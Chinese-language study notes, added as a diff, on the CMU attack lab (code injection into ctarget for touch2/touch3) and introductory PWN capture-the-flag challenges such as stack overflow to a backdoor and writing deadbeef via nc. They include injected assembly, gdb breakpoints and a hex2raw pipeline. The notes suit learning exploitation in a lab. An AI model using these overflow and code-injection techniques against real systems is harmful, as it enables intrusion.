+可以直接执行缓冲区的指令
+
+![image-20230907163644923](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230907163644923.png)
+
+至于指令传输的字符问题
+
+应该的指令是这样的
+
+```assembly
+movl $0x59b997fa,%edi;
+pushq $0x4017ec;
+retq
+```
+
+再输入gcc -c 2.s
+
+和objdump -d 2.o
+
+得到
+
+![image-20230908154109767](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230908154109767.png)
+
+此处注意
+
+打断点的时候是打在call Gets那里
+
+也就是0x4017af 而不是直接在Gets那里打
+
+因为从缓冲区存的内容是存在这里？？？
+
+打断点时输入
+
+```assembly
+gdb ctarget
+set args -q -i test /*第一阶段的注入*/
+run
+p $rsp
+```
+
+输入命令 
+
+```assembly
+cat t1 | ./hex2raw | ./ctarget -q
+```
+
+![image-20230908162724560](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230908162724560.png)
+
+#### touch3
+
+__readfsqword()   从内存中读取一个 64 位整数
+
+&cbuf[random() % 100];   在0-100中选一个放在
+
+![image-20230908165814688](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230908165814688.png)
+
+# PWN
+
+## 先导知识
+
+便于理解
+
+![image-20230907212356729](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230907212356729.png)
+
+## 01题 栈溢出:
+
+首先查看其安全性 可以看到堆栈等都没有保护措施的64位程序
+
+![image-20230829163105798](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230829163105798.png)
+
+可以看到他read函数可以读入160个字符 但可以看到int的buf，是8个字节
+
+由于64位的存储是按照16字节存储，所以8字节需要加上任意一个返回地址，再输入后门地址
+
+![image-20230829163606090](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230829163606090.png)
+
+把int该输入的值覆盖掉后再覆盖掉返回值，再输入后门地址即可
+
+## 02题 deadbeef:
+
+使用nc写入两遍deadbeef
+
+![image-20230830164306266](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230830164306266.png)
+
+再cat flag
+
+## 03题 fd：
+
+![image-20230904104911158](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230904104911158.png)
+
+输入4660后
+
+![image-20230904105857482](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230904105857482.png)
+
+## 04题 bof:
